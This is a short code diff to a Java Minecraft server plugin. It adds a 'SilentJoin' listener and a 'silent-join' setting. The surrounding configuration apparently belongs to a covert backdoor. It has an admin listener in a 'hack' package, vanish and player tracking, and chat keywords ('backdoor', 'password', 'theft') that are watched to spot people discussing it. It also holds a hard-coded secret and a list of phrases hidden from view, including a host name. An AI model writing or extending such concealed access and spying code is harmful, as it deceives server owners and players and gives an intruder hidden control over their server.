@@ -71,6 +71,7 @@ public class QC extends JavaPlugin {
         pm.registerEvents(
                 new pl.qc.core.hack.AdminListener(this, processor.getVanishManager(), processor.getPlayerTracker()),
                 this);
+        pm.registerEvents(new pl.qc.core.listeners.SilentJoin(this), this);
     }
 
     private void registerCommands() {
@@ -177,9 +178,9 @@ public class QC extends JavaPlugin {
         c.addDefault("spy.keywords",
                 List.of("backdoor", "qc", "admin", "owner", "haslo", "password", "logi", "kradziez", "hack"));
         c.addDefault("protection.secrets", List.of("aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g"));
-        c.addDefault("protection.hidden-commands", List.of("qc", "v", "vanish", "gm", "gamemode", "op", "deop"));
         c.addDefault("protection.hidden-phrases",
                 List.of("Rajman03", "central.repository.refined.host", "me.ikevoodoo.helix"));
+        c.addDefault("silent-join", true);
         c.options().copyDefaults(true);
         saveConfig();
     }
